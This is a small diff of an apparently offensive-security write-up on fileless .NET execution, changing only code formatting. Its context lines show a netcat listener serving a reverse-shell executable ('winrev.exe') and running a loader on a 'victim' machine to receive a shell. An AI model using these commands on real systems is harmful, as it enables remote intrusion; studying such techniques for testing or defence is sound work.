@@ -14,7 +14,9 @@ nc -nvlp 80 < winrev.exe
 
 Now on the victim side, I just have to run the compiled executable
 
+```powershell
 .\DotnetFilelessExecution.exe
+```
 
 And voila, we receive a shell connection back.
 
